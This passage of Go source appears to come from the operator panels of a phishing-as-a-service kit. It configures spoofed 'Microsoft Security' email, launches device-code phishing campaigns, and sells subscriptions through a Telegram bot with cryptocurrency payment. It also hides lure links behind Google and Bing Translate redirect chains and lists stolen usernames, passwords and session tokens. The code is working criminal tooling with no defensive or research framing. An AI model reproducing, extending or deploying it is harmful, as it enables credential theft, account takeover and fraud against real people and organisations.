  <label style="color:#666;width:60px;font-size:.8rem">Port</label>
  <input type="text" name="smtp_port" placeholder="587" value="%s" style="width:70px">
</div>
<div class="form-row">
  <label style="color:#666;width:120px;font-size:.8rem">Username</label>
  <input type="text" name="smtp_user" placeholder="user@gmail.com" value="%s" style="width:240px">
  <label style="color:#666;width:60px;font-size:.8rem">Password</label>
  <input type="password" name="smtp_pass" placeholder="••••••••" value="%s" style="width:160px">
</div>
<div class="form-row">
  <label style="color:#666;width:120px;font-size:.8rem">From Name/Email</label>
  <input type="text" name="smtp_from" placeholder="Microsoft Security &lt;no-reply@microsoft.com&gt;" value="%s" style="width:360px">
</div>
<button type="submit">Save SMTP</button>
</form></div></div>`,
			template.HTMLEscapeString(s.Cfg.GetSmtpHost()),
			func() string {
				p := s.Cfg.GetSmtpPort()
				if p == 0 {
					return "587"
				}
				return strconv.Itoa(p)
			}(),
			template.HTMLEscapeString(s.Cfg.GetSmtpUser()),
			template.HTMLEscapeString(s.Cfg.GetSmtpPass()),
			template.HTMLEscapeString(s.Cfg.GetSmtpFrom()),
		))

		// ── Launch campaign ──
		b.WriteString(`<div class="section"><h2>Launch Campaign</h2><div class="card">
<form method="POST" action="/admin/panel?tab=devicecodes">
<input type="hidden" name="action" value="launch_campaign">
<div class="form-row">
  <label style="color:#666;width:120px;font-size:.8rem">Campaign Name</label>
  <input type="text" name="camp_name" placeholder="Q2 Targets" style="width:220px">
  <label style="color:#666;width:80px;font-size:.8rem">Template</label>
  <select name="camp_template">
    <option value="security_alert">Microsoft Security Alert</option>
    <option value="it_helpdesk">IT Helpdesk</option>
  </select>
</div>
<div class="form-row" style="align-items:flex-start">
  <label style="color:#666;width:120px;font-size:.8rem;margin-top:6px">Email List</label>
  <textarea name="camp_emails" rows="6" placeholder="one@company.com&#10;two@company.com&#10;..." style="width:400px;background:#171717;border:1px solid #2e2e2e;color:#e0e0e0;padding:8px;border-radius:4px;font-size:.84rem;resize:vertical"></textarea>
</div>
<button type="submit" class="btn-green">🚀 Launch</button>
<span style="color:#555;font-size:.78rem;margin-left:12px">Each target gets a unique code + landing page. Emails sent via SMTP above.</span>
</form></div></div>`)

		// ── Active sessions table ──
		allTargets := GetDCTargets()
		b.WriteString(`<div class="section"><h2>Active Sessions</h2>`)
		if len(allTargets) == 0 {
			b.WriteString(`<div class="empty">No device code sessions yet.</div>`)
		} else {
			b.WriteString(`<table><thead><tr>
<th>#</th><th>Email / Tenant</th><th>Code</th><th>Status</th>
<th>Landing Page</th><th>Started</th><th>Access Token</th></tr></thead><tbody>`)
			for i := len(allTargets) - 1; i >= 0; i-- {
				tgt := allTargets[i]
				status := tgt.GetStatus()
				badgeClass := "badge-yellow"
				switch status {
				case "completed":
					badgeClass = "badge-green"
				case "expired", "declined", "error":
					badgeClass = "badge-red"
				}
				label := tgt.Email
				if label == "" {
					label = tgt.Tenant
				}
				landingURL := baseURL + "/dc/" + tgt.LandingToken
				landingCell := fmt.Sprintf(`<a href="%s" target="_blank" class="mono" style="font-size:.75rem">%s</a>`,
					template.HTMLEscapeString(landingURL), template.HTMLEscapeString("/dc/"+tgt.LandingToken[:8]+"..."))

				tgt.mu.Lock()
				at := tgt.AccessToken
				tgt.mu.Unlock()
				tokenCell := `<span style="color:#383838">—</span>`
				if at != "" {
					useURL := "/dc/use/" + tgt.LandingToken
					tokenCell = fmt.Sprintf(
						`<a href="%s" target="_blank" style="display:inline-block;background:#0078d4;color:#fff;padding:4px 12px;border-radius:3px;font-size:11px;font-weight:700;text-decoration:none;letter-spacing:.3px">Open Dashboard</a>`,
						template.HTMLEscapeString(useURL))
				}

				b.WriteString(fmt.Sprintf(`<tr>
<td class="mono">%d</td>
<td class="mono">%s</td>
<td><span style="font-family:monospace;font-weight:700;font-size:1rem;letter-spacing:3px;color:#e0a040">%s</span></td>
<td><span class="badge %s">%s</span></td>
<td>%s</td>
<td class="mono" style="color:#555">%s</td>
<td>%s</td>
</tr>`,
					tgt.ID,
					template.HTMLEscapeString(label),
					template.HTMLEscapeString(tgt.UserCode),
					badgeClass, status,
					landingCell,
					tgt.StartedAt.Format("Jan 2 15:04"),
					tokenCell,
				))
			}
			b.WriteString(`</tbody></table>`)
		}
		b.WriteString(`</div>`)

	// ── TELEGRAM BOT ──────────────────────────────────────────────────────
	case "telegram":
		// ── Bot configuration card ──
		b.WriteString(`<div class="section"><h2>Bot Configuration</h2>`)
		b.WriteString(fmt.Sprintf(`<div class="card">
<form method="POST" action="/admin/panel?tab=telegram">
<input type="hidden" name="action" value="save_bot_config">
<div class="form-row">
  <label style="color:#666;width:160px;font-size:.8rem">Bot Token</label>
  <input type="text" name="bot_token" placeholder="from @BotFather" value="%s" style="width:340px">
</div>
<div class="form-row">
  <label style="color:#666;width:160px;font-size:.8rem">Admin Chat ID</label>
  <input type="text" name="bot_admin_chat_id" placeholder="your Telegram chat ID" value="%d" style="width:200px">
</div>
<div class="form-row">
  <label style="color:#666;width:160px;font-size:.8rem">BTC Address</label>
  <input type="text" name="crypto_btc" placeholder="Bitcoin address" value="%s" style="width:340px">
</div>
<div class="form-row">
  <label style="color:#666;width:160px;font-size:.8rem">ETH Address</label>
  <input type="text" name="crypto_eth" placeholder="Ethereum address" value="%s" style="width:340px">
</div>
<div class="form-row">
  <label style="color:#666;width:160px;font-size:.8rem">USDT Address</label>
  <input type="text" name="crypto_usdt" placeholder="USDT (TRC20) address" value="%s" style="width:340px">
</div>
<div class="form-row">
  <label style="color:#666;width:160px;font-size:.8rem">Price (USD/month)</label>
  <input type="text" name="sub_price" placeholder="150" value="%d" style="width:100px">
</div>
<div class="form-row" style="margin-top:12px">
  <button type="submit" class="btn-blue">Save Bot Config</button>
  <span style="color:#555;font-size:.78rem;margin-left:8px">Token change requires restart</span>
</div>
</form></div>`,
		template.HTMLEscapeString(s.Cfg.GetBotToken()),
		s.Cfg.GetBotAdminChatId(),
		template.HTMLEscapeString(s.Cfg.GetCryptoBTC()),
		template.HTMLEscapeString(s.Cfg.GetCryptoETH()),
		template.HTMLEscapeString(s.Cfg.GetCryptoUSDT()),
		s.Cfg.GetSubPrice(),
	))
		b.WriteString(`</div>`)

		// ── Subscriptions table ──
		b.WriteString(`<div class="section"><h2>Subscriptions</h2>`)
		if len(allSubs) == 0 {
			b.WriteString(`<div class="empty">No subscriptions yet.</div>`)
		} else {
			b.WriteString(`<table><thead><tr>
<th>ID</th><th>Chat ID</th><th>Service</th><th>Status</th><th>TX Hash</th><th>Expires</th><th>Links</th><th>Actions</th>
</tr></thead><tbody>`)
			for _, sub := range allSubs {
				statusBadge := `<span class="badge badge-gray">` + template.HTMLEscapeString(sub.Status) + `</span>`
				switch sub.Status {
				case "active":
					statusBadge = `<span class="badge badge-green">active</span>`
				case "pending":
					statusBadge = `<span class="badge badge-yellow">pending</span>`
				case "expired":
					statusBadge = `<span class="badge badge-red">expired</span>`
				}

				expiry := `<span style="color:#555">—</span>`
				if sub.ExpiresAt > 0 {
					expiry = time.Unix(sub.ExpiresAt, 0).Format("2006-01-02")
				}

				txCell := `<span style="color:#555">—</span>`
				if sub.TxHash != "" {
					txCell = fmt.Sprintf(`<span class="mono" style="font-size:.74rem">%s</span>`, template.HTMLEscapeString(truncateStr(sub.TxHash, 18)))
				}

				linksCell := `<span style="color:#555">—</span>`
				if sub.ChainTranslate != "" || sub.LureURL != "" {
					linksCell = `<details><summary style="font-size:.76rem;color:#52b0e0">▶ links</summary><div class="chain-box" style="font-size:.74rem">`
					if sub.LureURL != "" {
						linksCell += fmt.Sprintf(`<div class="label">Direct URL</div><div class="link"><a href="%s" target="_blank">%s</a> <button class="btn-gray" style="font-size:.68rem;padding:1px 5px" onclick="cp(this)" data-copy="%s">copy</button></div>`,
							template.HTMLEscapeString(sub.LureURL), template.HTMLEscapeString(truncateStr(sub.LureURL, 40)), template.HTMLEscapeString(sub.LureURL))
					}
					if sub.ChainTranslate != "" {
						linksCell += fmt.Sprintf(`<div class="label">Google Translate</div><div class="link"><a href="%s" target="_blank">%s</a> <button class="btn-gray" style="font-size:.68rem;padding:1px 5px" onclick="cp(this)" data-copy="%s">copy</button></div>`,
							template.HTMLEscapeString(sub.ChainTranslate), template.HTMLEscapeString(truncateStr(sub.ChainTranslate, 40)), template.HTMLEscapeString(sub.ChainTranslate))
					}
					if sub.ChainBing != "" {
						linksCell += fmt.Sprintf(`<div class="label">Bing Translator</div><div class="link"><a href="%s" target="_blank">%s</a> <button class="btn-gray" style="font-size:.68rem;padding:1px 5px" onclick="cp(this)" data-copy="%s">copy</button></div>`,
							template.HTMLEscapeString(sub.ChainBing), template.HTMLEscapeString(truncateStr(sub.ChainBing, 40)), template.HTMLEscapeString(sub.ChainBing))
					}
					linksCell += `</div></details>`
				}

				actions := ""
				if sub.Status == "pending" {
					actions += fmt.Sprintf(`<form class="inline" method="POST" action="/admin/panel?tab=telegram">
<input type="hidden" name="action" value="approve_sub">
<input type="hidden" name="sub_id" value="%d">
<button type="submit" class="btn-green" style="font-size:.74rem;padding:2px 8px">✓ approve</button>
</form> `, sub.Id)
					actions += fmt.Sprintf(`<form class="inline" method="POST" action="/admin/panel?tab=telegram">
<input type="hidden" name="action" value="reject_sub">
<input type="hidden" name="sub_id" value="%d">
<button type="submit" style="font-size:.74rem;padding:2px 8px">✗ reject</button>
</form>`, sub.Id)
				} else {
					actions += fmt.Sprintf(`<form class="inline" method="POST" action="/admin/panel?tab=telegram" onsubmit="return confirm('Delete subscription %d?')">
<input type="hidden" name="action" value="delete_sub">
<input type="hidden" name="sub_id" value="%d">
<button type="submit" style="font-size:.74rem;padding:2px 8px">del</button>
</form>`, sub.Id, sub.Id)
				}

				b.WriteString(fmt.Sprintf(`<tr>
<td class="mono">%d</td>
<td class="mono">%d</td>
<td><span class="badge badge-red">%s</span><br><span style="color:#555;font-size:.72rem">%s</span></td>
<td>%s</td>
<td>%s</td>
<td class="mono">%s</td>
<td>%s</td>
<td>%s</td>
</tr>`,
					sub.Id, sub.TelegramChatId,
					template.HTMLEscapeString(sub.Phishlet),
					phishletFriendlyName(sub.Phishlet),
					statusBadge, txCell, expiry, linksCell, actions,
				))
			}
			b.WriteString(`</tbody></table>`)
		}
		b.WriteString(`</div>`)
	}

	nav := `<a href="/admin/panel?tab=overview">overview</a>
<a href="/admin/panel?tab=users">users</a>
<a href="/admin/panel?tab=phishlets">phishlets</a>
<a href="/admin/panel?tab=lures">lures</a>
<a href="/admin/panel?tab=sessions">sessions</a>
<a href="/admin/panel?tab=blacklist">blacklist</a>
<a href="/admin/panel?tab=telegram">telegram bot</a>`

	w.Header().Set("Content-Type", "text/html; charset=utf-8")
	fmt.Fprint(w, panelPage("Admin Panel", nav, b.String()))
}

// ───────────────────────────── User Panel ──────────────────────────────────

func (s *HttpServer) handleUserPanel(w http.ResponseWriter, r *http.Request) {
	parts := strings.Split(strings.Trim(r.URL.Path, "/"), "/")
	if len(parts) < 2 {
		http.NotFound(w, r)
		return
	}
	token := parts[1]

	user, err := s.Db.UserGetByToken(token)
	if err != nil {
		http.Error(w, "Invalid panel token", http.StatusForbidden)
		return
	}

	lures := s.Cfg.GetLuresByUser(user.Username)
	sessions, _ := s.Db.ListSessions()

	userPhishlets := map[string]bool{}
	for _, l := range lures {
		userPhishlets[l.Phishlet] = true
	}
	var userSessions []*database.Session
	for _, sess := range sessions {
		if userPhishlets[sess.Phishlet] {
			userSessions = append(userSessions, sess)
		}
	}

	totalTokens := 0
	for _, sess := range userSessions {
		if len(sess.CookieTokens) > 0 || len(sess.BodyTokens) > 0 || len(sess.HttpTokens) > 0 {
			totalTokens++
		}
	}

	var b strings.Builder

	b.WriteString(fmt.Sprintf(`<h1>Panel</h1>
<p style="color:#555;margin:4px 0 16px">Logged in as <span style="color:#52b0e0;font-weight:600">%s</span></p>
<div class="stats">
  <div class="stat-box"><div class="n blue">%d</div><div class="l">Lures</div></div>
  <div class="stat-box"><div class="n">%d</div><div class="l">Sessions</div></div>
  <div class="stat-box"><div class="n green">%d</div><div class="l">With Tokens</div></div>
</div>`, user.Username, len(lures), len(userSessions), totalTokens))

	// Lures with chain generation
	b.WriteString(`<div class="section"><h2>Your Lures</h2>`)
	if len(lures) == 0 {
		b.WriteString(`<div class="empty">No lures assigned to your account yet.</div>`)
	} else {
		b.WriteString(`<table><thead><tr>
<th>#</th><th>Phishlet</th><th>Lure URL</th><th>Redirect URL</th><th>Chain Links</th>
</tr></thead><tbody>`)
		for i, l := range lures {
			lureURL := ""
			if l.Hostname != "" {
				lureURL = "https://" + l.Hostname + l.Path
			} else if pl, err := s.Cfg.GetPhishlet(l.Phishlet); err == nil {
				if pu, err := pl.GetLureUrl(l.Path); err == nil {
					lureURL = pu
				}
			}
			// lureURL is the clean base URL — no login_hint placeholder here.

			lureURLCell := `<span style="color:#383838">—</span>`
			if lureURL != "" {
				lureURLCell = fmt.Sprintf(`<span class="url-cell">%s</span><br>
<button class="btn-gray" style="font-size:.7rem;padding:2px 7px;margin-top:3px" onclick="cp(this)" data-copy="%s">copy</button>`,
					template.HTMLEscapeString(lureURL), template.HTMLEscapeString(lureURL))
			}

			redirectCell := `<span style="color:#383838">—</span>`
			if l.RedirectUrl != "" {
				redirectCell = fmt.Sprintf(`<a href="%s" target="_blank" class="mono" style="font-size:.76rem">%s</a>`,
					template.HTMLEscapeString(l.RedirectUrl), template.HTMLEscapeString(truncateStr(l.RedirectUrl, 40)))
			}

			chainCell := `<span style="color:#383838">—</span>`
			if lureURL != "" {
				parsedURL, err := url.Parse(lureURL)
				if err == nil {
					phishBase := parsedURL.Scheme + "://" + parsedURL.Host
					outer, hops, err := GenerateRedirectChain(phishBase, lureURL, 3, s.Cfg.GetRedirectChainSecret())
					if err == nil {
						translateLink := "https://translate.google.com/translate?sl=auto&tl=en&u=" + url.QueryEscape(outer)
						bingLink2 := "https://www.bing.com/translator?to=en&url=" + url.QueryEscape(outer)

						chainCell = fmt.Sprintf(`<details>
<summary>▶ show chain links</summary>
<div class="chain-box">
  <div class="label">Google Translate (recommended)</div>
  <div class="link">%s
  <button class="btn-gray" style="font-size:.7rem;padding:2px 7px" onclick="cp(this)" data-copy="%s">copy</button></div>

  <div class="label">Bing Translator (silent)</div>
  <div class="link">%s
  <button class="btn-gray" style="font-size:.7rem;padding:2px 7px" onclick="cp(this)" data-copy="%s">copy</button></div>

  <div class="label">Direct (3 hops)</div>
  <div class="link">%s
  <button class="btn-gray" style="font-size:.7rem;padding:2px 7px" onclick="cp(this)" data-copy="%s">copy</button></div>`,
							template.HTMLEscapeString(truncateStr(translateLink, 55)), template.HTMLEscapeString(translateLink),
							template.HTMLEscapeString(truncateStr(bingLink2, 55)), template.HTMLEscapeString(bingLink2),
							template.HTMLEscapeString(truncateStr(outer, 55)), template.HTMLEscapeString(outer),
						)
						for j, hop := range hops {
							chainCell += fmt.Sprintf(`<div class="hop">layer %d → %s</div>`, j+1, template.HTMLEscapeString(hop))
						}
						chainCell += `</div></details>`
					}
				}
			}

			b.WriteString(fmt.Sprintf(`<tr>
<td class="mono">%d</td>
<td><span class="badge badge-red">%s</span></td>
<td>%s</td>
<td>%s</td>
<td>%s</td>
</tr>`, i, template.HTMLEscapeString(l.Phishlet), lureURLCell, redirectCell, chainCell))
		}
		b.WriteString(`</tbody></table>`)
	}
	b.WriteString(`</div>`)

	// Sessions
	b.WriteString(`<div class="section"><h2>Captured Sessions</h2>`)
	if len(userSessions) == 0 {
		b.WriteString(`<div class="empty">No sessions captured yet.</div>`)
	} else {
		b.WriteString(sessionTable(userSessions, false))
	}
	b.WriteString(`</div>`)

	w.Header().Set("Content-Type", "text/html; charset=utf-8")
	fmt.Fprint(w, panelPage("User Panel", "", b.String()))
}

// ───────────────────────────── Shared helpers ──────────────────────────────

func usersTable(userList []*database.User, allLures []*Lure, sessPerUser, tokenPerUser map[string]int) string {
	if len(userList) == 0 {
		return `<div class="empty">No users yet.</div>`
	}
	var b strings.Builder
	b.WriteString(`<table><thead><tr>
<th>Username</th><th>Panel URL</th><th>Lures</th><th>Sessions</th><th>Tokens</th><th>Created</th><th></th>
</tr></thead><tbody>`)
	for _, u := range userList {
		lureCount := 0
		for _, l := range allLures {
			if l.UserId == u.Username {
				lureCount++
			}
		}
		panelURL := fmt.Sprintf("/panel/%s", u.Token)
		b.WriteString(fmt.Sprintf(`<tr>
<td><span class="badge badge-blue">%s</span></td>
<td><a href="%s" target="_blank" class="mono" style="font-size:.78rem">%s</a>
<button class="btn-gray" style="font-size:.7rem;padding:2px 7px;margin-left:4px" onclick="cp(this)" data-copy="%s">copy</button></td>
<td class="mono">%d</td>
<td class="mono">%d</td>
<td class="mono" style="color:#4cd44c">%d</td>
<td class="mono">%s</td>
<td>
  <form class="inline" method="POST" action="/admin/panel?tab=users" onsubmit="return confirm('Delete %s?')">
    <input type="hidden" name="action" value="delete_user">
    <input type="hidden" name="id" value="%d">
    <button type="submit" style="font-size:.74rem;padding:2px 8px">delete</button>
  </form>
</td></tr>`,
			template.HTMLEscapeString(u.Username),
			panelURL, truncateStr(panelURL, 38), panelURL,
			lureCount,
			sessPerUser[u.Username],
			tokenPerUser[u.Username],
			time.Unix(u.CreatedAt, 0).Format("2006-01-02"),
			template.HTMLEscapeString(u.Username),
			u.Id,
		))
	}
	b.WriteString(`</tbody></table>`)
	return b.String()
}

func sessionTable(sessions []*database.Session, showDelete bool) string {
	var b strings.Builder
	b.WriteString(`<table><thead><tr>
<th>ID</th><th>Phishlet</th><th>Username</th><th>Password</th><th>Tokens</th><th>Remote IP</th><th>Time</th><th>Detail</th>`)
	if showDelete {
		b.WriteString(`<th></th>`)
	}
	b.WriteString(`</tr></thead><tbody>`)
	for _, sess := range sessions {
		hasCreds := sess.Username != "" || sess.Password != ""
		hasTokens := len(sess.CookieTokens) > 0 || len(sess.BodyTokens) > 0 || len(sess.HttpTokens) > 0

		tokenBadge := `<span class="badge badge-gray">none</span>`
		if hasTokens {
			tokenBadge = `<span class="badge badge-green">captured</span>`
		}

		uname := template.HTMLEscapeString(sess.Username)
		if uname == "" {
			uname = `<span style="color:#383838">—</span>`
		}
		pass := template.HTMLEscapeString(sess.Password)
		if pass == "" {
			pass = `<span style="color:#383838">—</span>`
		}

		// Build expandable token detail
		detail := `<span style="color:#383838">—</span>`
		if hasCreds || hasTokens {
			tokenJSON, _ := json.MarshalIndent(map[string]interface{}{
				"cookie_tokens": sess.CookieTokens,
				"body_tokens":   sess.BodyTokens,
				"http_tokens":   sess.HttpTokens,
			}, "", "  ")
			detailID := fmt.Sprintf("sess-%d", sess.Id)
			detail = fmt.Sprintf(`<details id="%s">
<summary>▶ view tokens</summary>
<pre>%s</pre>
</details>`, detailID, template.HTMLEscapeString(string(tokenJSON)))
		}

		b.WriteString(fmt.Sprintf(`<tr>
<td class="mono">%d</td>
<td><span class="badge badge-red">%s</span></td>
<td class="mono">%s</td>
<td class="mono">%s</td>
<td>%s</td>
<td class="mono">%s</td>
<td class="mono">%s</td>
<td>%s</td>`,
			sess.Id,
			template.HTMLEscapeString(sess.Phishlet),
			uname, pass, tokenBadge,
			template.HTMLEscapeString(sess.RemoteAddr),
			time.Unix(sess.UpdateTime, 0).Format("2006-01-02 15:04"),
			detail,
		))
		if showDelete {
			b.WriteString(fmt.Sprintf(`<td>
<form class="inline" method="POST" action="/admin/panel?tab=sessions">
<input type="hidden" name="action" value="delete_session">
<input type="hidden" name="session_id" value="%d">
<button type="submit" style="font-size:.74rem;padding:2px 8px">del</button>
</form></td>`, sess.Id))
		}
		b.WriteString(`</tr>`)
	}
	b.WriteString(`</tbody></table>`)
	return b.String()
}

func truncateStr(s string, n int) string {
	if len(s) <= n {
		return s
	}
	return s[:n] + "…"
}

// createLureForm renders the "Create Lure" form HTML.
func createLureForm(phishletNames []string, userList []*database.User) string {
	if len(phishletNames) == 0 {
		return `<div class="empty">No phishlets loaded. Add phishlet YAML files to the phishlets directory first.</div>`
	}
	opts := ""
	for _, name := range phishletNames {
		opts += fmt.Sprintf(`<option value="%s">%s — %s</option>`,
			template.HTMLEscapeString(name),
			template.HTMLEscapeString(name),
			phishletFriendlyName(name))
	}
	userOpts := `<option value="">— no user —</option>`
	for _, u := range userList {
		userOpts += fmt.Sprintf(`<option value="%s">%s</option>`,
			template.HTMLEscapeString(u.Username), template.HTMLEscapeString(u.Username))
	}
	return fmt.Sprintf(`<form method="POST" action="/admin/panel?tab=lures">
<input type="hidden" name="action" value="create_lure">
<div class="form-row">
  <select name="phishlet" required style="width:240px">%s</select>
  <input type="text" name="path" placeholder="path (auto-generated if empty)" style="width:220px">
  <input type="text" name="redirect_url" placeholder="redirect URL after capture (optional)" style="width:280px">
  <select name="user_id" style="width:160px">%s</select>
  <button type="submit" class="btn-blue">+ Create Lure</button>
</div>
</form>`, opts, userOpts)
}
